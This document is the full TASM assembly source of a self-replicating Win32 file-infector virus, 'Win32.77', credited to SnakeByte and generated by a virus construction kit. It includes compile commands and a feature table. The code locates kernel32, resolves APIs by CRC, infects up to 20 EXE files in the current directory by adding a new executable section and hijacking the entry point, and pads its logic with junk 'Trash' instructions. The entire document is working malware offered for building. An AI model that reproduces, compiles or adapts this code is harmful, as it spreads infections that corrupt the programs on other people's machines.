              
;
;
; Win32.77 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.77
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 3/14/2016
;  Infection Mark         : 77
;  Infection Type         : adding a new section 
;  API Search             : Simple CRC I
;  Entry Point Obscurity  : No
;  Locate Kernel by       : using address from stack
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 9
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m1 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 8d

VirusCode:
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 pop ecx
 sub ecx, offset Delta
                                        ; mov ebp, ecx
 mov ebp, ecx
 jmp KernelSearchStart


;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 mov edi, dword ptr [esp]
                                        ; round to pages
 mov di, 0h
                                        ; set maximum search count
 mov dword ptr [ebp+K32Trys], 4h

GK1:                                    ; check for DOS-EXE Stub
 cmp dword ptr [ebp+K32Trys], 0h
 jz NoKernel
                                        ; check for ZM
 cmp word ptr [edi], 'ZM'
 je CheckPE
 xor dword ptr [ebp+Trash1], 1440454    ; Trash

GK2:
 mov ecx, 77101302d                     ; Trash
 sub edi, 65536d
 mov ecx, 63415303d                     ; Trash
 sub dword ptr [ebp+K32Trys], 1
 jmp GK1

CheckPE:                                ; Check if found file is a win32 exe
 mov eax, [edi+3Ch]
 xchg eax, edi
 add edi, eax
 xchg eax, edi
                                        ; check for EP
 cmp word ptr [eax], 'EP'
 je CheckDLL
 jmp GK2

CheckDLL:
                                        ; check if the file is a DLL
                                        ; add eax, 22
 add eax, 22d
                                        ; clear ebx
 mov ebx, -18929d
 add ebx, 18929d
 sub edx, ecx                           ; Trash
 movzx ebx, word ptr [eax]
 and bx, 0F000h
 cmp bx, 02000h
 jne GK2
GotDLL:                                 ; we found a DLL file
 sub eax, 22d


KernelFound:
 mov dword ptr [ebp+KernelPE], 0
 add dword ptr [ebp+KernelPE], eax
 add dword ptr [ebp+Trash1], 832347     ; Trash
 mov dword ptr [ebp+KernelMZ], edi

 lea ecx, GetApis
 add ecx, ebp
 not eax                                ; Trash

 push ecx
ret


;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
 push 0
 push 0
 push 3
 push 0
 push 1
 mov edx, 80000000h or 40000000h
 push edx
 mov ecx, offset WFD_szFileName
 or ebx, 2800754d                       ; Trash
 add ecx, ebp

 push ecx
 call dword ptr [ebp+XCreateFileA]

 add eax, 1
 jz Closed
 dec eax

 mov dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
 mov edx, dword ptr [ebp+WFD_nFileSizeLow]
 push edx
 push 0
 push edx
 push 0
 ror ecx, 25d                           ; Trash
 push 00000004h
 push 0
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 add dword ptr [ebp+Trash1], 1550999    ; Trash
 mov dword ptr [ebp+MapHandle], 0
 add dword ptr [ebp+MapHandle], eax
 pop edx
 test eax, eax
 jz CloseFile
 push edx
 not ebx                                ; Trash
 push 0
 push 0
 push 2h
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 add eax, -1
 inc eax
 jz UnMapFile
 push eax
 pop dword ptr [ebp+MapAddress]
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]
 ror ebx, 11d                           ; Trash

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 add ebx, 93351629d                     ; Trash
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;                  [ ///// * Data * \\\\\ ]

Data:
 TempApisearch2 dd 0h
newsection:                           ; Settings for the new section
 nsname           db '.byQOOcB'
 nsvirtualsize    dd 0                ; Virtual Size
 nsRVA            dd 0                ; Relative Virtual Address
 nsphysicalsize   dd 0                ; Size of Raw Data
 nsphysicaloffset dd 0                ; Pointer to Size of Raw Data
 nsreserved       dd 0,0,0            ; reserved
 nsflags          db 40h,0,0,0c0h     ; Section is executable code and writeable

 FindHandle  dd 0h
 AlignReg1   dd 0h
 sectionalign   dd 0h
 NewSize     dd 0h
 OTableVA    dd 0h
 KernelMZ    dd 0h
 Trash1      dd 0h
 ATableVA    dd 0h
 Misc1       dd 0h
 MapHandle   dd 0h
 InfCounter  dd 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 KernelPE    dd 0h
 AlignReg2   dd 0h
 MapAddress  dd 0h
 NTableVA    dd 0h
 OldBase     dd 400000h
 FileHandle  dd 0h
 PEheader    dd 0h
 db 'Win32.77 - SnakeByte',0
 TempAPI     dd 0h
 filemask    db '*.EXe',0
 K32Trys     dd 0h

 counter     dw 0h
 NewEIP      dd 0h
 filealign   dd 0h
 OldEIP      dd 0h

 APIOffsets:
 XCreateFileMappingA    dd 0h
 XCloseHandle           dd 0h
 XMapViewOfFile         dd 0h
 XCreateFileA           dd 0h
 XFindFirstFileA        dd 0h
 XFindClose             dd 0h
 XUnmapViewOfFile       dd 0h
 XFindNextFileA         dd 0h


 APINames:
 dd 'Cr'+'ea'+'te'+'Fi'+'le'+'Ma'+'pp'+'in'+'gA'
 dd 'Cl'+'os'+'eH'+'an'+'dl'+'e'*100h
 dd 'Ma'+'pV'+'ie'+'wO'+'fF'+'il'+'e'*100h
 dd 'Cr'+'ea'+'te'+'Fi'+'le'+'A'*100h
 dd 'Fi'+'nd'+'Fi'+'rs'+'tF'+'il'+'eA'
 dd 'Fi'+'nd'+'Cl'+'os'+'e'*100h
 dd 'Un'+'ma'+'pV'+'ie'+'wO'+'fF'+'il'+'e'*100h
 dd 'Fi'+'nd'+'Ne'+'xt'+'Fi'+'le'+'A'*100h





;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
 mov ebx, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header
 mov eax, [ebx+3Ch]
 add eax, ebx
                                        ; get File Alignment
                                        ; add eax, 60
 inc eax
 add eax, 59d
 mov ecx, [eax]
                                        ; mov edx, 60
 mov edx, ( 60d - 20d )
 add edx, 20d
 sub eax, edx
 mov dword ptr [ebp+filealign], 0
 add dword ptr [ebp+filealign], ecx
 mov esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov ebx, dword ptr [esi+3Ch]
 add ebx, esi
                                        ; infection by adding a new section
                                        ; as described by Lord Julus
 mov dword ptr [ebp+PEheader], 0
 add dword ptr [ebp+PEheader], ebx
                                        ; get old Entrypoint
 mov ecx, dword ptr [ebx+28h]
 mov dword ptr [ebp+OldEIP], ecx
 mov ecx, dword ptr [ebx+34h]
 mov dword ptr [ebp+OldBase], ecx
 mov edx, [ebx+38h]
 mov dword ptr [ebp+sectionalign], edx
                                        ; Get last section
 mov eax, [ebx+74h]
 shl eax, 3
                                        ; clear edx
 push 0
 pop edx
 mov dx, word ptr [ebx+6h]
 mov ecx, 28h
 pushad
 mov eax, edx
 mul ecx
 mov dword ptr [ebp+Misc1], eax
 popad
 mov edx, dword ptr [ebp+Misc1]
 add ebx, 78h
 add ebx, eax
 add ebx, edx
 lea edi, [ebp+newsection]
 xchg edi, ecx


 xchg ecx, ebx
 push ecx
                                        ; Calculate the RVA of the new section
 mov edx, [ecx-5*8+8d]
 add edx, [ecx-5*8+12d]
 mov eax, dword ptr [ebp + offset sectionalign]
 push edx
 and dword ptr [ebp+Trash1], edx        ; Trash
 pop dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp+AlignReg2], eax
 mov dword ptr [ebp+nsphysicalsize], edx
 or ebx, 51943121d                      ; Trash
 Call Align
 mov edx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp + offset nsRVA], edx
                                        ;  calculate the virtual size of the new section
 mov edx, dword ptr [ebp + offset sectionalign]
 mov dword ptr [ebp+AlignReg1], VirusSize
 mov dword ptr [ebp+AlignReg2], 0
 xor dword ptr [ebp+AlignReg2], edx
 Call Align
 mov eax, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp+nsvirtualsize], eax
                                        ; calculate physical offset
 mov eax,[ecx-5*8+20d]
 add eax,[ecx-5*8+16d]
 mov ebx,dword ptr [ebp + offset filealign]
 mov dword ptr [ebp+AlignReg1], eax
 adc edx, eax                           ; Trash
 mov dword ptr [ebp+AlignReg2], ebx
 Call Align
 mov eax, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp+nsphysicaloffset], eax
                                        ; calculate new size
 mov edx, dword ptr [ebp+filealign]
 add dword ptr [ebp+Trash1], edx        ; Trash
 mov ecx, eax
 add ecx, VirusSize
 mov dword ptr [ebp+AlignReg1], 0
 xor dword ptr [ebp+AlignReg1], ecx
 mov dword ptr [ebp+AlignReg2], edx
 call Align
 mov ecx, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], ecx
 pushad
 Call UnMapFile2
 popad
 push ecx
 pop dword ptr [ebp+WFD_nFileSizeLow]
 call CreateMap
 jc NoEXE
 add eax, edx                           ; Trash
                                        ; mov ebx, 64
 push 64d
 pop ebx
 pop eax
 lea edx, [ebp+newsection]

WriteNewSectionLoop:
 mov ch, byte ptr [edx]
 mov byte ptr [eax], ch
 and dword ptr [ebp+Trash1], ebx        ; Trash
                                        ; add edx, 1
 sub edx, -1d
 sub ebx, 1
                                        ; add eax, 1
 add eax, 1d
 or ebx, ebx
 jnz WriteNewSectionLoop
                                        ; increase section numbers
 mov ecx, dword ptr [ebp+PEheader]
 sub word ptr [ecx+06h], -1
 mov ebx, dword ptr [ebp+nsRVA]
 mov dword ptr [ebp+NewEIP], ebx
                                        ; set new EIP
 mov dword ptr  [ecx+28h], ebx
                                        ; set infection mark
 mov dword ptr [ecx+4Ch], '77'
                                        ; clear ecx
 mov ecx, -47031d
 add ecx, 47031d
 add ecx, dword ptr [ebp+nsphysicaloffset]
 push ecx
                                        ; Append Virus
 pop edi
 add edi, dword ptr [ebp+MapAddress]
 mov edx, VirusSize
 lea esi, [ebp+Virus]


AppendLoop:
 movsb
 dec edx
 jnz AppendLoop
                                        ; decrease Infection Counter
                                        ; clear ebx
 mov ebx, -53101d
 add ebx, 53101d
 add ebx, dword ptr [ebp+InfCounter]
 add ebx, -1
 mov dword ptr [ebp+InfCounter], ebx
 clc
ret

NoEXE:
 pop ebx
 stc
ret



;          [ ///// * FindFiles Procedure * \\\\\ ]

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 lea edx, [ebp+WIN32_FIND_DATA]
 xchg edx, ebx

 push ebx
 push eax
 call dword ptr [ebp+XFindFirstFileA]
 neg ecx                                ; Trash
 mov dword ptr [ebp+FindHandle], eax
ret


ClearOldData:                           ; we don't want waste in the fields
 pushad
                                        ; mov ebx, 276
 mov ebx, 276d
 mov edx, ebp
 add edx, offset WFD_szFileName
 and ecx, 12841446d                     ; Trash


ClearOldData2:
 mov byte ptr [edx], 0h
 add ecx, 34093533d                     ; Trash
                                        ; add edx, 1
 sub edx, -1d
 dec ebx
 jnz ClearOldData2
 popad
ret


FindNextFileProc:                       ; find another file
 call ClearOldData
 lea ebx, [ebp+WIN32_FIND_DATA]
 xchg eax, ebx

 push eax
                                        ; clear ecx
 and ecx, 0
 add ecx, dword ptr [ebp+FindHandle]
 push ecx
 call dword ptr [ebp+XFindNextFileA]
ret





;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; check for minimum filesize
 sub ebx, eax                           ; Trash
 cmp dword ptr [ebp+WFD_nFileSizeLow], 20000d
 jbe NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
                                        ; clear eax
 push 0
 pop eax
 add eax, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 cmp word ptr [eax], 'ZM'
 je Goodfile
                                        ; clear ecx
 sub ecx, ecx
 test ecx, ecx
 jz Notagoodfile

Goodfile:
                                        ; clear ebx
 push 0
 pop ebx
 mov bx, word ptr [eax+3Ch]
 dec ebx
 add ebx, 1
 jz Notagoodfile
 push dword ptr [eax+3Ch]
 pop edi
                                        ; check if header lies inside the file
 cmp dword ptr [ebp+WFD_nFileSizeLow],edi
 jb Notagoodfile
 add edi, eax
                                        ; check for PE Header
                                        ; check for EP
 movzx ecx, word ptr [edi]
 xor ecx, 'EP'
 jz Goodfile2
                                        ; mov ecx, 49898
 mov ecx, ( 49898d - 26d )
 add ecx, 26d
 cmp ecx, 49898d
 je Notagoodfile
 xor edx, edx                           ; Trash

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [edi+4Ch], '77'
 jz Notagoodfile
                                        ; check for DLL
 mov bx, word ptr [edi+16h]
 and bx, 0F000h
 cmp bx, 02000h
 je Notagoodfile
                                        ; check for OBJ
 mov bx, word ptr [edi+16h]
 and bx, 00002h
 cmp bx, 00002h
 jne Notagoodfile
 call InfectEXE                         ; Infect the file
 jnc Notagoodfile
 jmp NoInfection

Notagoodfile:
 call UnMapFile

NoInfection:
ret




;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...
                                        ; store old EIP and ImageBase
 mov eax, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], eax

                                        ; mov eax, -1
 mov eax, ( -1d + 15d )
 sub eax, 15d
 and eax, dword ptr [ebp+OldEIP]

 and dword ptr [ebp+Trash1], ebx        ; Trash
 mov dword ptr [ebp+retEIP], eax




;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 push 20d
 pop dword ptr [ebp+InfCounter]
 lea edi, [ebp+filemask]
 xchg eax, edi

                                        ; Find File to infect
 call FindFirstFileProc
                                        ; add eax, 1
 inc eax
 test eax, eax
 jz EndInfectCurDir

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
 mov ebx, dword ptr [ebp+InfCounter]
                                        ; add ebx, 1
 inc ebx
 sub ebx, 1
 jz EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 cmp eax, 0
 jne InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
 push dword ptr [ebp+FindHandle]
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need
 mov esi, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
                                        ; clear ecx
 xor ecx, ecx
 add ecx, [esi+78h]
 add ecx, [ebp+KernelMZ]
                                        ; add ecx, 28
 add ecx, 28d
                                        ; get ATableVA
 mov esi, dword ptr [ecx]
                                        ; add ecx, 4
 add ecx, 4d
 add esi, [ebp+KernelMZ]
 mov dword ptr [ebp+ATableVA], esi
                                        ; get NTableVA
 mov esi, dword ptr [ecx]
 add esi, [ebp+KernelMZ]
 neg eax                                ; Trash
                                        ; add ecx, 4
 add ecx, 4d
 not edx                                ; Trash
 mov dword ptr [ebp+NTableVA], esi
                                        ; get OTableVA
 mov esi, dword ptr [ecx]
 add esi, [ebp+KernelMZ]
 sub eax, ebx                           ; Trash
 mov dword ptr [ebp+OTableVA], esi
 and dword ptr [ebp+Trash1], eax        ; Trash

                                        ; number of API's we're looking for
                                        ; clear edx
 xor edx, edx
 add edx, NumberOfApis
 mov ecx, 1284634d                      ; Trash

                                        ; load API Names and Offsets
 lea eax, [ebp+APINames]
 xchg eax, esi

 mov ebx, offset APIOffsets
 add ebx, ebp


GetApisLoop: 
                                        ; clear the counter
 mov word ptr [ebp+counter], 0h
 mov ecx, 39192153d                     ; Trash

                                        ; search 'em
                                        ; esi points to the CRC
                                        ; ebx points to the offset

 call SearchAPI1
                                        ; add esi, 4
 inc esi
 add esi, 3d
 and eax, ebx                           ; Trash
                                        ; clear eax
 push 0
 pop eax
 xor eax, dword ptr [ebp+TempAPI]
 mov dword ptr [ebx], eax
                                        ; add ebx, 4
 add ebx, 4d
 dec edx
 jnz GetApisLoop
 jmp Outbreak



;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; esi Points to API-CRC ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad
 shr eax, 25d                           ; Trash




 mov ecx, dword ptr [ebp+NTableVA]


SearchNextApi1:                         ; search for the API's
 push ecx
 mov edx, dword ptr [ebp+KernelMZ]
 add edx, dword ptr [ecx]
                                        ; mov ecx, edx
 push edx
 pop ecx
                                        ; mov edi, edx
                                        ; clear edi
 sub edi, edi
 add edi, edx
 mov dword ptr [ebp+TempApisearch2], edi
 push esi
 cld

                                        ; edi Points to API-Name ( Kernel )
                                        ; esi Points to API-Name CRC ( Virus )
                                        ; compare Names
                                        ; simple CRC Api Search by Lethalmind
                                        ; clear eax
 push 0
 pop eax
 add eax, dword ptr [esi]
 LoopChsksm:
                                        ; clear ebx
 and ebx, 0
 mov bl, byte ptr [edi]
                                        ; add edi, 1
 sub edi, -1d
 clc 
 sal bx,8d
 sub eax, ebx
 cmp bx, 0
 je LoopConti
                                        ; clear ebx
 mov ebx, 12543d
 sub ebx, 12543d
 mov bl, byte ptr [edi]
                                        ; add edi, 1
 add edi, 1d
 sub eax, ebx
 cmp bx, 0
 jne LoopChsksm
LoopConti:
 test eax, eax
 jz FoundApi1

ApiNotFound:                            ; we did not find it :(
 pop esi
 pop ecx
 mov edi, dword ptr [ebp+TempApisearch2]
                                        ; add ecx, 4
 dec ecx
 and ebx, ebx                           ; Trash
 add ecx, 5d
 sub word ptr [ebp+counter], -1
 or edx, 36213368d                      ; Trash
 cmp word ptr [ebp+counter], 2000h
 jne SearchNextApi1
 jmp NotFoundApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 add esp, 4h
 add esp, 4h
                                        ; retrieve the offset
                                        ; clear ecx
 xor ecx, ecx
 mov cx, word ptr [ebp+counter]
                                        ; point to ordinal Table
 sal ecx, 1                             ; multiply with 2
 add ecx, dword ptr [ebp+OTableVA]
 mov edx, ecx
 movzx ecx, word ptr [edx]
 clc
 rcl ecx, 2h
 shr ebx, 3d                            ; Trash
 add ecx, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 mov edx, dword ptr [ecx]
 add edx, dword ptr [ebp+KernelMZ]
 mov dword ptr [ebp+TempAPI], edx
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop ebx
 popad
 jmp ExecuteHost



;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
 mov eax, edx                           ; Trash
                                        ; store old EIP and ImageBase
 mov edi, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], edi

 and ebx, 81846888d                     ; Trash
 push dword ptr [ebp+OldBase]
 pop edi

 mov dword ptr [ebp+retBase], edi

 sbb edx, 13d                           ; Trash


ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
 test ebp, ebp
 jz FirstGenHost
 mov eax,12345678h
 org $-4
 retBase dd 0h
 add eax,12345678h
 org $-4
 retEIP dd 0h
 jmp eax



;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
 mov eax, dword ptr [ebp+AlignReg1]
 sub ebx, ebx                           ; Trash
                                        ; clear edx
 mov edx, -43254d
 add edx, 43254d
 mov ecx, dword ptr [ebp+AlignReg2]
 div ecx
                                        ; add eax, 1
 inc eax
 mul ecx
 mov dword ptr [ebp+AlignReg1], eax
 popad
ret



CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
 push 0h
 sub ebx, 71177766d                     ; Trash
 call ExitProcess



end FakeCode

